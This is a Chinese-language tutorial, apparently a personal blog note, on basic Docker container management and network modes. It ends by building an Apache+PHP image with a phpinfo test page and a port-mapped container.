<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker create -t -i ubuntu:20.04 /bin/bash</span><br><span class="line">e94cf81e102f33880cc1e21d9e50985eaac9927642d925009c4cadc761bb2d8c</span><br><span class="line">root@Executor:~# docker ps -a | grep e94</span><br><span class="line">e94cf81e102f   ubuntu:20.04                  &quot;/bin/bash&quot;   20 seconds ago   Created                                                                 quirky_chatelet</span><br></pre></td></tr></table></figure>
<p>已经创建但是从未运行过的容器,其状态为"Created"</p>
<blockquote>
<p>这里命令行的作用是,规定容器启动后要自动执行的命令</p>
<p><code>/bin/bash</code>意思是启动后立刻执行<code>/bin/bash</code>这条命令,如果之前默认的shell是bash则无所谓,如果之前默认的shell是sh,tsh等等其他shell,则改为使用bash</p>
</blockquote>
<blockquote>
<p>关于"启动选项"和"命令行参数"</p>
<p>一定要分清两个东西,前者规定的是如何启动容器,后者规定的是启动后容器立刻自动干啥</p>
</blockquote>
<p><strong>删除容器</strong>前提是该容器没有被运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm &lt;容器&gt;</span><br></pre></td></tr></table></figure>
<p>运行状态的容器需要强制删除</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm -f &lt;容器&gt;</span><br></pre></td></tr></table></figure>
<p>删除所有容器</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker  <span class="built_in">rm</span> $(docker ps -a -q)</span><br><span class="line">e94cf81e102f</span><br><span class="line">205041549d08</span><br><span class="line">fa210e84dd67</span><br><span class="line">bce56d6e5727</span><br><span class="line">08142959bdde</span><br><span class="line">dd33995e37ab</span><br><span class="line">3a666c93b635</span><br><span class="line">b458aa62f64c</span><br><span class="line">85c3fa6b67d3</span><br><span class="line">3519c8f7070f</span><br><span class="line">79543801ed50</span><br><span class="line">897a086a85f4</span><br></pre></td></tr></table></figure>
<p>或者使用<code>docker container prune</code></p>
<h5 id="查看所有容器">查看所有容器</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE                         COMMAND       CREATED          STATUS                        PORTS     NAMES</span><br><span class="line">08142959bdde   ubuntu:20.04                  &quot;bash&quot;        21 minutes ago   Exited (0) 18 minutes ago               awesome_austin</span><br><span class="line">dd33995e37ab   ubuntu:20.04                  &quot;bash&quot;        23 minutes ago   Exited (0) 23 minutes ago               festive_lamarr</span><br><span class="line">3a666c93b635   ubuntu:20.04                  &quot;bash&quot;        24 minutes ago   Exited (129) 38 seconds ago             quirky_kilby</span><br><span class="line">b458aa62f64c   ubuntu:20.04                  &quot;-t&quot;          24 minutes ago   Created                                 angry_mclean</span><br><span class="line">85c3fa6b67d3   ubuntu:20.04                  &quot;bash&quot;        24 minutes ago   Exited (0) 24 minutes ago               quizzical_grothendieck</span><br><span class="line">3519c8f7070f   ubuntu:20.04                  &quot;bash&quot;        25 minutes ago   Exited (0) 25 minutes ago               affectionate_kare</span><br><span class="line">79543801ed50   ubuntu:20.04                  &quot;bash&quot;        26 minutes ago   Exited (0) 23 minutes ago               sleepy_driscoll</span><br><span class="line">897a086a85f4   ansible/ubuntu14.04-ansible   &quot;/bin/bash&quot;   2 hours ago      Exited (255) 2 hours ago                friendly_bhaskara</span><br></pre></td></tr></table></figure>
<table>
<colgroup>
<col style="width: 15%" />
<col style="width: 10%" />
<col style="width: 75%" />
</colgroup>
<thead>
<tr>
<th>栏目</th>
<th>意义</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>CONTAINER ID</td>
<td>容器</td>
<td>注意不是镜像id,本地所有容器都有一个自己独特的id,用于区分和索引</td>
</tr>
<tr>
<td>IMAGE</td>
<td>镜像</td>
<td>容器是从哪个镜像创建的</td>
</tr>
<tr>
<td>COMMAND</td>
<td>命令行</td>
<td>create创建或者run创建并启动时的命令行参数</td>
</tr>
<tr>
<td>CREATED</td>
<td>创建时间</td>
<td>使用docker run创建该容器的时间</td>
</tr>
<tr>
<td>STATUS</td>
<td>状态</td>
<td>created（已创建）<br />restarting（重启中）<br />running（运行中）
<br />removing（迁移中） <br />paused（暂停） <br />exited（停止）
<br />dead（死亡）</td>
</tr>
<tr>
<td>PORTS</td>
<td>端口</td>
<td>容器的端口信息和使用的连接类型（tcp）</td>
</tr>
<tr>
<td>NAMES</td>
<td>名称</td>
<td>Docker自动给每个容器都起一个名字,格式是:形容词__名<br />awesome_austin<br />festive_lamarr<br />...<br />如果要人为给容器起名字,需要在docker
run的命令行上加上<code>--name=&lt;名字&gt;</code></td>
</tr>
</tbody>
</table>
<h5 id="运行停止容器">运行/停止容器</h5>
<p>容器用create创建之后不会执行,需要start命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker start [启动选项] &lt;容器&gt;</span><br><span class="line">docker start [启动选项] &lt;容器1&gt; &lt;容器2&gt; ...</span><br><span class="line">docker stop [停止选项] &lt;容器&gt;</span><br><span class="line">docker stop [停止选项] &lt;容器1&gt;&lt;容器2&gt; ...</span><br></pre></td></tr></table></figure>
<p>启动选项要么是<code>-a(attach)</code>,要么是<code>-i(interactive)</code></p>
<p>对于<code>stop</code>(或者<code>kill</code>)指令,其停止选项可以是多长时间之后停止</p>
<blockquote>
<p>关于"启动选项"和"命令行参数"</p>
<p>一定要分清两个东西,前者规定的是如何启动容器,后者规定的是启动后容器立刻自动干啥</p>
<p>ps -a列出的COMMAND栏目,这是docker
create时指定的<strong>命令行参数</strong>,它告诉容器启动后自动做什么</p>
<p>而docker
start的<strong>启动选项</strong>只有两种,-a或者-i,区别是:</p>
<p>-a只会将容器的标准输出绑定到当前终端,<code>docker start -a &lt;容器&gt;</code>执行后,这时候可以看到容器的输出<code>root@容器id</code></p>
<p>但是尝试在终端输入什么命令,都不会有结果,但是终端也没有阻塞,可以一直输入.</p>
<p>这是因为-a启动的容器,其标准输入并没有绑定到终端,因此我们在终端的任何输入都没有发往容器.</p>
<p>也就是说我们可以从终端上接收docker容器的输出,但是没法给他输入</p>
<p>这貌似很奇怪,因为没有输入哪来的输出呢?</p>
<p>实际上可以在创建容器的时候指定<strong>命令行参数</strong>,让容器启动就自动执行一些命令,此时这些命令的输出就可以打印到终端</p>
<p>比如创建一个在后台自动每1秒执行一次打印"helloworld"的容器,然后用<code>-a</code>启动参数启动它,就可以看到它一直向终端输出<code>helloworld</code>了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker create ubuntu:20.04 /bin/sh -c &quot;while true; do echo hello world; sleep 1; done&quot;</span><br><span class="line">167d2e45de172117166431467875f3e44f81a29fbaa1e786fecf2caf77227d25</span><br><span class="line">root@Executor:~# docker start -a 167</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>-i会将容器的标准输入绑定到当前终端</p>
</blockquote>
<p>使用<code>docker start</code>默认后台运行容器,该命令执行后终端环境还是在wsl中,相应容器已经在后台运行</p>
<p>如果想要让容器在前台与我们交互,可以使用<code>-i</code>启动选项(前提是,create创建容器的时候有加入-it选项,否则start使用-i选项无效)</p>
<p>即:</p>
<p><strong>使用<code>docker create -it &lt;容器&gt;</code>这样创建的容器,使用<code>docker start &lt;容器&gt;</code>会在后台运行(即使没有长期任务也会一直运行),使用<code>docker start -i &lt;容器&gt;</code>会在前台交互.</strong></p>
<p><strong>使用<code>docker create &lt;容器&gt;</code>这样创建的容器,最多可以<code>docker start -a &lt;容器&gt;</code>绑定输出(前提是create时命令行上有长期的任务),但是<code>docker start -i &lt;容器&gt;</code>无效,如果创建容器时命令行上没有给容器指定一个长期的任务,那么后台运行的容器会立刻停止</strong></p>
<h5 id="创建运行容器">创建+运行容器</h5>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>其作用相当于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker create [OPTIONS] &lt;镜像&gt; [COMMAND][ARG...]</span><br><span class="line">docker start [OPTIONS] &lt;容器&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>OPTIONS是docker start 的启动选项啊</p>
<p>COMMAND是docker create的命令行参数</p>
<p>一定要分清两者</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -t -i &lt;镜像&gt; /bin/bash</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里镜像可以是镜像id,也可以是仓库源:镜像标签</p>
<p>-it一起用,意思是让docker分配一个伪终端,并绑定到容器的标准输入</p>
<p>说人话-t作用是加上<code>root@容器号:</code>这种命令提示,不用-t,只有-i也可以进行命令交互,但是不会有这种提示</p>
<p>后面命令行/bin/bash意思是,启动后自动运行bash(虽然默认也是运行的bash,但是可能有些容器默认运行sh),使用bash这个shell进行交互</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker run -t -i ubuntu:20.04</span><br><span class="line">root@08142959bdde:/#</span><br></pre></td></tr></table></figure>
<p>可以发现主机名已经由<code>Executor</code>编变成了容器的id号,现在的终端已经是docker内部环境了</p>
<p>这里容器id和镜像id不同,本地的每个容器都有一个不同的id</p>
<p>如果要退出容器到wsl,只需要在docker容器的终端中输入exit</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker run -t -i ubuntu:20.04</span><br><span class="line">root@08142959bdde:/# exit</span><br><span class="line">exit</span><br><span class="line">root@Executor:~#</span><br></pre></td></tr></table></figure>
<p>主机名又变回Executor说明目前已经在wsl中了</p>
<p>Exit命令执行后,该docker容器立刻停止.后来如果还想继续使用则需要在wsl中使用docker
start命令</p>
<blockquote>
<p>创建容器时Docker干了啥</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220722210940799.png"
alt="image-20220722210940799" />
<figcaption aria-hidden="true">image-20220722210940799</figcaption>
</figure>
<p>单从"桥接一个虚拟接口到容器",就知道物理机和docker容器在同一个网段</p>
</blockquote>
<p><strong>后台运行</strong></p>
<p>刚才已经知道,直接用<code>docker run -t -i ubuntu:20.04</code>这种命令创建容器时,创建容器后终端环境是容器中环境,主机名会变成docker容器号</p>
<p>而现在只想让docker容器运行,但是终端依然是wsl的环境,不进入docker容器,应该咋整呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d &lt;镜像&gt; &lt;命令行参数&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker run -d -it ubuntu:20.04</span><br><span class="line">fa210e84dd679b8402a78ca404988fe7ec031f0475385631f95fb497d764e86b</span><br><span class="line">root@Executor:~# docker ps -a | grep fa21</span><br><span class="line">fa210e84dd67   ubuntu:20.04                  &quot;bash&quot;        12 seconds ago      Up 12 seconds                            intelligent_austin</span><br><span class="line">root@Executor:~#</span><br></pre></td></tr></table></figure>
<p>可以发现,<code>run -d</code>创建容器并运行之后,终端上还是显示<code>root@Executor</code>表明仍然在wsl中,没有进到容器里</p>
<p>相当于<code>docker create -it &lt;容器&gt;</code>然后<code>docker run &lt;容器&gt;</code></p>
<h5 id="进入退出容器">进入/退出容器</h5>
<p>对于正在后台运行的容器,如果想要进入容器与之交互,需要使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker attach [选项] &lt;正在运行的容器&gt; [命令行]</span><br><span class="line">docker exec [选项] &lt;正在运行的容器&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>两者的区别是,</p>
<p>使用attach进入容器,在容器中用exit退出时,容器会停止运行</p>
<p>使用exec进入容器,在容器中用exit退出时,容器会继续运行</p>
</blockquote>
<p>由于在wsl中可以使用<code>docker stop</code>命令停止容器,因此只使用<code>exec</code>命令即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE          COMMAND   CREATED             STATUS         PORTS     NAMES</span><br><span class="line">49e5c3d8f7c6   ubuntu:20.04   <span class="string">&quot;bash&quot;</span>    About an hour ago   Up 9 minutes             lucid_ramanujan</span><br><span class="line">root@Executor:~# docker <span class="built_in">exec</span> -it 49 bash</span><br><span class="line">root@49e5c3d8f7c6:/# <span class="built_in">exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">root@Executor:~# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE          COMMAND   CREATED             STATUS         PORTS     NAMES</span><br><span class="line">49e5c3d8f7c6   ubuntu:20.04   <span class="string">&quot;bash&quot;</span>    About an hour ago   Up 9 minutes             lucid_ramanujan</span><br></pre></td></tr></table></figure>
<p>退出容器使用<code>exit</code>,或者<code>ctrl+d</code></p>
<h5 id="导出导入容器">导出/导入容器</h5>
<p>将容器导出成tar包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker export &lt;容器&gt; &gt; &lt;位置&gt;</span><br></pre></td></tr></table></figure>
<p>比如将<code>49e5c3d8f7c6</code>这个容器(已安装ssh)导出到当前目录</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/home/docker# docker <span class="built_in">export</span> 49 &gt; ssh-ubuntu.tar</span><br><span class="line">root@Executor:/home/docker# <span class="built_in">ls</span></span><br><span class="line">ssh-ubuntu.tar</span><br></pre></td></tr></table></figure>
<p>将tar包导入成镜像(不能直接导入成容器)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker import [OPTIONS] &lt;tar包&gt; &lt;镜像&gt;</span><br></pre></td></tr></table></figure>
<p>将tar包导入为指定名称的镜像</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/home/docker# <span class="built_in">ls</span></span><br><span class="line">ssh-ubuntu.tar</span><br><span class="line">root@Executor:/home/docker# docker import ssh-ubuntu.tar ssh/ubuntu</span><br><span class="line">sha256:725bf542d42fc0f7aad48f47ef2b81d1bcf7931bd1283a2b91ccbd3f8246e876</span><br><span class="line">root@Executor:/home/docker# docker images</span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">ssh/ubuntu   latest    725bf542d42f   5 seconds ago   234MB</span><br><span class="line">ubuntu       20.04     20fffa419e3a   6 weeks ago     72.8MB</span><br></pre></td></tr></table></figure>
<p>后面使用该镜像只需要<code>docker run -it &lt;镜像&gt; bash</code></p>
<h2 id="docker网络">docker网络</h2>
<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/212772001">Docker
网络模式详解及容器间网络通信 - 知乎 (zhihu.com)</a></p>
<p><a
target="_blank" rel="noopener" href="https://www.cnblogs.com/zuxing/articles/8780661.html#:~:text=Docker：网络模式详解.%20Docker作为目前最火的轻量级容器技术，牛逼的功能，如Docker的镜像管理，不足的地方网络方面。.%20安装Docker时，它会自动创建三个网络，bridge（创建容器默认连接到此网络）、%20none,、host.%20host：容器将不会虚拟出自己的网卡，配置自己的IP等，而是使用宿主机的IP和端口。.%20Container：创建的容器不会创建自己的网卡，配置自己的IP，而是和一个指定的容器">Docker：网络模式详解
- Gringer - 博客园 (cnblogs.com)</a></p>
<h3 id="四个模式">四个模式</h3>
<h4 id="host">host</h4>
<p>docker容器与wsl共用ip地址,docker服务直接使用wsl的端口地址空间,外界可以通过ip:port方式访问docker容器</p>
<h4 id="none">none</h4>
<p>无网络链接</p>
<h4 id="bridge">bridge</h4>
<p>桥接模式,安装Docker时会为wsl创建一个叫做docker0的虚拟网桥</p>
<p>这个网桥只对桥接的docker容器还有wsl本身可见,作用是wsl和桥接容器之间的通信</p>
<p>两个接到同一网桥的容器或者容器和网桥之间均可以相互通信</p>
<p>对于容器来说,wsl上的网桥就相当于一个交换机</p>
<p>wsl:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# ifconfig</span><br><span class="line">docker0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        inet6 fe80::42:d9ff:fedd:7c32  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 02:42:d9:dd:7c:32  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 23965  bytes 1142407 (1.1 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 39791  bytes 118121373 (118.1 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
<p>容器1:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@2c98c979b54a:/# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.4  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        ether 02:42:ac:11:00:04  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 147  bytes 206651 (206.6 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 120  bytes 8092 (8.0 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
<p>容器2:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@7cf02bb435be:/var/www/html# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 6  bytes 516 (516.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
<p>wsl的docker0网卡,两个容器的eth0网卡,其IP地址都是<code>172.17.0.X</code>(实际上从子网掩码看出该网段的IP地址可以是<code>172.17.X.X</code>)</p>
<blockquote>
<p>docker的桥接和虚拟机的桥接不同</p>
<p>虚拟机和主机桥接之后,虚拟机,主机,主机连接的路由器,都在同一网段</p>
<p>docker容器和docker主机的桥接,所有docker容器和docker主机的docker0网卡在同一网段,docker主机的另一张网卡eth0和路由器在同一网段</p>
<figure>
<img
src="https://images2018.cnblogs.com/blog/1259802/201804/1259802-20180410165500455-232801094.jpg"
alt="img" />
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>docker容器和docker0网桥相连使用了veth
pair技术,每个容器的eth0都与docker0上的一个veth*(一个数字)配对,两个虚拟网卡组成数据通道,从一个进去必然从另一出来</p>
<p>说是"桥接",实际上相当于docker主机进行了一个NAT变换</p>
<p>所有容器的数据通过自己的虚拟网卡eth0发往docker主机的虚拟
网卡docker0,然后docker主机用"外网"网卡eth0上网(这里外网是相对于docker0虚拟网桥而言的,当然相对于路由器来说eth0还是"内网")</p>
</blockquote>
<h4 id="container">container</h4>
<p>两个容器共享同一网络空间,包括ip地址和端口号</p>
<p>目前用不到,用到时再说</p>
<h3 id="docker网络相关命令">docker网络相关命令</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network ...</span><br></pre></td></tr></table></figure>
<h4 id="查看网络模式">查看网络模式</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network list</span><br></pre></td></tr></table></figure>
<p>列出三个默认的网络模式</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker network <span class="built_in">ls</span></span><br><span class="line">NETWORK ID     NAME      DRIVER    SCOPE</span><br><span class="line">3ce19195196f   bridge    bridge    <span class="built_in">local</span></span><br><span class="line">c1341214f1d0   host      host      <span class="built_in">local</span></span><br><span class="line">d4e52924ce6b   none      null      <span class="built_in">local</span></span><br></pre></td></tr></table></figure>
<p>目前只用到<code>docker network list</code>命令,其他需要以后再说</p>
<h2 id="配置apache2php环境">配置apache2+php环境</h2>
<p>由于官方的镜像不能满足要求,我需要修改官方镜像创建满足我们要求的镜像</p>
<h3 id="容器内基本配置">容器内基本配置</h3>
<p>首先要从官方的镜像改造一个满足我们要求的镜像</p>
<p>这需要经历一个<code>官方镜像-&gt;改造容器-&gt;导出新镜像</code>的过程</p>
<h4 id="拉取apachephp镜像">拉取apache+php镜像</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull php:7.0-apache</span><br></pre></td></tr></table></figure>
<h4 id="创建临时容器">创建临时容器</h4>
<blockquote>
<p>说他是"临时容器",是因为我们需要用这个基础镜像创建容器进行一些改造,然后生成我们需要的镜像</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it php:7.0-apache bash</span><br></pre></td></tr></table></figure>
<h4 id="换docker容器的apt下载源">换docker容器的apt下载源</h4>
<h5 id="备份">备份</h5>
<p>备份原来的下载源</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/apt/sources.list /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure>
<h5 id="更新">更新</h5>
<p>更新下载源,由于此时没有vi没有vim,只能用cat等shell命令完成</p>
<blockquote>
<p>换元之前先看一下容器的操作系统版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@06ca8ea43c1c:/var/www/html# cat /etc/issue</span><br><span class="line">Debian GNU/Linux 9 \n \l</span><br></pre></td></tr></table></figure>
<p>然后上网搜对应版本的国内源进行更换</p>
</blockquote>
<p>适用于<code>Debian GNU/LINUX 9</code>的阿里云源:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat &gt; /etc/apt/sources.list &lt;&lt; EOF</span><br><span class="line">deb http://mirrors.aliyun.com/debian/ stretch main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/debian/ stretch main non-free contrib</span><br><span class="line">deb http://mirrors.aliyun.com/debian-security stretch/updates main</span><br><span class="line">deb-src http://mirrors.aliyun.com/debian-security stretch/updates main</span><br><span class="line">deb http://mirrors.aliyun.com/debian/ stretch-updates main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/debian/ stretch-updates main non-free contrib</span><br><span class="line">deb http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
<h4 id="配置网站">配置网站</h4>
<p>在该容器的网站根目录<code>/var/www/html</code>下面,写一个<code>info.php</code>,打印php信息作为测试</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在系统根目录下写一个<code>/start.sh</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 restart   </span><br><span class="line">/usr/bin/tail -f /dev/null</span><br></pre></td></tr></table></figure>
<blockquote>
<p>第一条作用是启动apache2服务器,第二条作用是,让执行这条命令的容器一直有前台进程在忙,防止docker容器自动停止</p>
</blockquote>
<h4
id="安装ssh等其他可有可无的服务...">安装ssh等其他可有可无的服务...</h4>
<h4 id="导出镜像">导出镜像</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit &lt;容器&gt; apache/ubuntu:latest</span><br></pre></td></tr></table></figure>
<blockquote>
<p>将该容器导出为一个叫"apache/ubuntu:latest"的容器</p>
</blockquote>
<h3 id="从新镜像创建新容器">从新镜像创建新容器</h3>
<p>现在使用<code>docker run</code>命令,从新<code>apache/ubuntu:latest</code>镜像上创建并启动新容器</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -dit -p 10011:80 apache/ubuntu:latest /bin/bash -c <span class="string">&quot;/start.sh&quot;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>-d后台运行</p>
<p>-it启动交互终端</p>
<p>-p 10011:80,wsl的10011端口映射到容器的80端口</p>
<p>apache/ubuntu:latest我们自定义的镜像名</p>
<p>/bin/bash -c "/start.sh"命令行参数,启动后立刻自动执行</p>
<p>没有指定网络模式默认为桥接模式</p>
<p>没有指定端口上的传输层服务类型默认为TCP服务</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker run -dit -p 10011:80 apache/ubuntu /bin/bash -c <span class="string">&quot;/start.sh&quot;</span></span><br><span class="line">edc1b61f6c7a20ce4d85989ffa4c5042dc13769161f4d89952604a8496b869d1</span><br><span class="line">root@Executor:~# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND                  CREATED         STATUS        PORTS                                     NAMES</span><br><span class="line">edc1b61f6c7a   apache/ubuntu   <span class="string">&quot;docker-php-entrypoi…&quot;</span>   2 seconds ago   Up 1 second   0.0.0.0:10011-&gt;80/tcp, :::10011-&gt;80/tcp   friendly_northcutt</span><br></pre></td></tr></table></figure>
